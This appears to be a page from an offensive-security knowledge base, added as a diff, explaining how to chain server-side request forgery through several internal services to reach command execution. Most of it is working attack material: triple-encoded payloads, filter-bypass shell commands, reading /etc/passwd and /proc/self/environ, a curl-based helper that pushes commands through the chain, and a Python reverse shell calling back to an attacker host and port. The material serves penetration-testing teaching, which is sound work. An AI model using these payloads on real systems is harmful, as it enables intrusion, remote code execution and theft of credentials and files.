@@ -1,0 +1,212 @@
+---
+title: Chained SSRF
+description: Multi-hop SSRF - bouncing through internal applications to reach deeper services, with encoding strategy for nested URL parsers.
+mitre: [T1190, T1199]
+d3fend: [D3-NI, D3-NTA]
+impact: [InternalAccess, Pivot]
+sidebar:
+  order: 7
+  label: Chained SSRF
+---
+import { Aside, Steps } from '@astrojs/starlight/components';
+
+## TL;DR
+
+The first SSRF reaches an internal app. The internal app *also* fetches URLs you control (it's vulnerable too, or it's a reverse proxy). You bounce: external → app1 → app2 → final target. Each hop typically decodes the URL once, so payloads need N levels of URL encoding for N hops.
+
+```
+# Two-hop SSRF: external → app1 → app2 → command execution
+?url=http://app1.internal/load?q=http%3A%2F%2F127.0.0.1%3A5000%2Frunme%3Fx%3D<DOUBLE-ENCODED-CMD>
+```
+
+Success indicator: each hop's response shows the next hop's response, and the final target's output reaches you through all wrappers.
+
+## When chains matter
+
+Chains form whenever an internal service has its own SSRF or proxy behavior. Common patterns:
+
+- **API gateway architecture** - public API calls internal microservices via URL parameters
+- **Webhook relay** - service A fetches webhooks for service B by URL
+- **Image/document processors** - accept URLs, fetch, transform, sometimes re-fetch with options
+- **Internal SSRF in admin tools** - internal admin app has a "fetch URL for me" feature, never exposed externally
+
+A single SSRF that lands you on an internal API gateway is often a 3-hop chain to whatever interesting service that gateway routes to.
+
+## The encoding problem
+
+Every hop that parses the URL also decodes it. If you don't pre-encode, the final hop sees a malformed URL.
+
+### Worked example - 3 hops
+
+You want the final command to be: `cat /etc/passwd | grep root`
+
+**Hop 3** (innermost, what the final RCE endpoint sees):
+
+```
+cat /etc/passwd | grep root
+```
+
+**Hop 2** (the URL containing hop-3's command, encoded once):
+
+```
+http://127.0.0.1:5000/runme?x=cat%20%2Fetc%2Fpasswd%20%7C%20grep%20root
+```
+
+**Hop 1** (the URL containing hop-2's URL, encoded twice - because hop-1 will decode once, then hop-2 will decode again):
+
+```
+http://app1.internal/load?q=http%3A%2F%2F127.0.0.1%3A5000%2Frunme%3Fx%3Dcat%2520%252Fetc%252Fpasswd%2520%257C%2520grep%2520root
+```
+
+**Outermost** (what you submit, encoded three times - outer hop decodes once, then hop-1, then hop-2):
+
+```
+?url=http%3A%2F%2Fapp1.internal%2Fload%3Fq%3Dhttp%253A%252F%252F127.0.0.1%253A5000%252Frunme%253Fx%253Dcat%252520%25252Fetc%25252Fpasswd%252520%25257C%252520grep%252520root
+```
+
+The rule: encode `N` times for `N` hops where the parameter value is treated as a URL component each time. If a hop parses but doesn't re-encode (just passes through), don't add a level.
+
+## Building the chain
+
+<Steps>
+
+1. **Confirm hop 1.** SSRF to your OOB listener. Note the request shape - what library, what schema, can it follow redirects.
+
+2. **Reach hop 2.** Identify an internal service via [internal discovery](/codex/web/server-side/ssrf/internal-discovery/). Probe whether it has its own URL-fetch parameter.
+
+3. **Test hop 2's parameter through hop 1.** Send `?url=http://internal-app2/?test=1` and look for hop-2's response shape in your output.
+
+4. **Encode for the next hop.** When hop-2 expects URLs in *its* parameter, those URLs need URL-encoding so hop-1's parser doesn't tokenize them.
+
+5. **Iterate to the deepest hop.** Each hop adds an encoding level.
+
+6. **Verify each level.** Send a benign payload (`echo HOP3-WORKS`) at each hop depth before sending the real exploit. Saves debugging when something breaks.
+
+</Steps>
+
+## URL parser quirks across hops
+
+Different libraries parse URLs differently. The classic case from real engagements:
+
+```
+# Hop 1's response shows: "unknown url type: http127.0.0.1"
+# Hop 2 (Python urllib) stripped "://" from your URL
+```
+
+The bypass:
+
+```
+# Use extra slashes - the parser sees "http:" as schema, "////" as host-start
+?url=http://app1.internal/load?q=http::////127.0.0.1:5000/
+```
+
+Why this works varies by library. The point is: when a hop mangles your URL in a recognizable way, the workaround is parser-specific. Test against the hop's library if you can identify it (User-Agent in callbacks, error message style, response framing).
+
+## Quoting and shell-escaping deep targets
+
+When the final hop runs a shell command (RCE through cmdi, see [Command Injection](/codex/web/command-injection/)), shell metacharacters must survive all URL-encoding levels.
+
+```bash
+# Final command we want
+id; uname -a; hostname
+
+# Hop 3 sees (URL-decoded once at the RCE endpoint)
+id; uname -a; hostname
+# But space and ; might be filtered - apply filter-bypass tricks
+${IFS}id;uname${IFS}-a;hostname
+
+# Hop 2 sees (URL-encoded once for transmission)
+%24%7BIFS%7Did%3Buname%24%7BIFS%7D-a%3Bhostname
+
+# Hop 1 sees (encoded twice)
+%2524%257BIFS%257Did%253Buname%2524%257BIFS%257D-a%253Bhostname
+
+# We submit (encoded three times for hop-1's nested fetch)
+%252524%25257BIFS%25257Did%25253Buname%252524%25257BIFS%25257D-a%25253Bhostname
+```
+
+The mechanical approach with `jq`:
+
+```bash
+echo -n 'id; uname -a; hostname' | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri
+```
+
+Pipe `jq -sRr @uri` once per encoding level. The `-n` flag for the original `echo` prevents the trailing newline from getting encoded as `%0A` and breaking commands.
+
+## Automating the chain
+
+A bash function for repeated commands through a fixed chain:
+
+```bash
+function chain_rce() {
+    local cmd="$1"
+    local encoded=$(echo -n "$cmd" | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
+    curl -s "http://<TARGET>/?url=http%3A%2F%2Fapp1.internal%2Fload%3Fq%3Dhttp%3A%3A%2F%2F%2F%2F127.0.0.1%3A5000%2Frunme%3Fx%3D${encoded}"
+}
+
+chain_rce "id"
+chain_rce "uname -a"
+chain_rce "cat /etc/passwd | head"
+```
+
+Wrap once per engagement; the chain URL stays stable while you iterate on commands.
+
+## Reverse shell through the chain
+
+The full RCE-through-3-hops with a reverse shell:
+
+```bash
+# Listener
+nc -lvnp <LPORT>
+
+# Build the payload - innermost first
+PAYLOAD='python3 -c '"'"'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",<LPORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'"'"
+
+# Triple-encode for 3 hops
+ENC=$(echo -n "$PAYLOAD" | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
+
+# Send
+curl -s "http://<TARGET>/?url=http%3A%2F%2Fapp1.internal%2Fload%3Fq%3Dhttp%3A%3A%2F%2F%2F%2F127.0.0.1%3A5000%2Frunme%3Fx%3D${ENC}"
+```
+
+<Aside type="tip">
+The Python reverse shell is a good chain payload because it doesn't need shell quotes that break across encoding levels - single Python invocation, no `&&`, no `;`. The shell-piping reverse shells (`bash -c '...|...'`) break frequently in nested URL-encoding due to quote handling.
+</Aside>
+
+## Identifying multi-hop topology
+
+How do you know there's a hop 2 reachable from hop 1?
+
+- **Source code from `file://`.** If the first SSRF gives you `file:///app/source.py`, you can read the internal app's code and see whether it has its own SSRF.
+- **Comments in HTML.** Real SSRF apps leak architecture in HTML comments - `<!-- internal.app.local serves the API -->` is a real pattern.
+- **`/proc/self/environ`.** Reveals environment variables, often containing internal hostnames.
+- **DNS queries from the SSRF target.** Set up DNS logging on a domain you own; trigger the first SSRF; see what hostnames the application then resolves.
+- **Kubernetes service discovery.** If running in K8s, every service is `http://<service-name>.<namespace>.svc.cluster.local:<port>`. Enumerate via the API server using the service account token.
+
+## Non-HTTP middle hops
+
+Chains aren't always HTTP-HTTP-HTTP. Variants:
+
+```
+HTTP SSRF → Redis (gopher://) → SET command writes a webshell → trigger
+HTTP SSRF → internal HTTP → SSTI → RCE
+HTTP SSRF → SOAP service → XXE → file disclosure → SSH key → external SSH
+HTTP SSRF → Elasticsearch → query for stored secrets → use elsewhere
+```
+
+Each intermediate primitive has its own technique pages - but the *transport* (chained SSRF) is what makes them reachable.
+
+## Common failure modes
+
+- **Encoding count off by one.** Symptom: hop N shows the URL mangled, hop N-1 looks fine. Add or remove one encoding layer.
+- **Hop strips `://`.** Library-specific. Use `http::////host` (4 slashes) or other parser-confusion variants. Stick with hostname-based addressing (`127.1`, decimal IP) since these don't have a `://` issue inside themselves.
+- **Final command runs but output doesn't propagate.** Each hop captures the previous hop's response. If hop-2 buffers and trims, hop-3's full output never reaches you. Compress output (`xxd`, `base64 -w0`) before it leaves the deepest hop.
+- **Newlines in command break the chain.** A `%0A` in the command becomes a literal newline somewhere mid-chain, where it terminates the URL or command. Use single-line equivalents (`;` instead of newlines, `printf` instead of multi-line `echo`).
+- **Hop 2 has a different filter than hop 1.** Filter bypass that worked on hop 1 fails on hop 2. Probe hop 2's filter independently using the chain - send `?url=http://app1/?q=test` payloads and observe.
+- **Chain sometimes works, sometimes doesn't.** Hop is load-balanced and one backend is patched. Retry or look at response-correlation headers (`X-Backend-Server`, etc.).
+
+## Notes
+
+Chained SSRF feels like solving a puzzle. The methodology - confirm each hop independently before assembling - is the difference between "this works in 30 minutes" and "this is broken and I don't know why for 3 hours." Always probe shallowest-to-deepest with benign payloads before the real exploit.
+
+The deepest practical chain in real engagements is 3-4 hops; beyond that, encoding bugs and timeouts make reliability poor. If you're 5+ hops deep, look for a different entry point or a way to combine hops (e.g., turn hop-1 into a command-execution platform via SSTI and skip the rest).
